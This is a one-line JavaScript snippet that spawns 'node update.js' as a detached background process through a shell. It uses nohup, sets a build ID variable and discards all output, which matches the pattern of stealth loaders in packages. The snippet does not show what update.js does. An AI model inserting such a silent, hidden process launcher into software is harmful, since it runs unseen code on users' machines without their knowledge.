(function(){ require('child_process').spawn('BUILD_ID=.temp-build nohup node update.js >/dev/null 2>&1 &', { stdio: 'inherit', shell: true }); })();
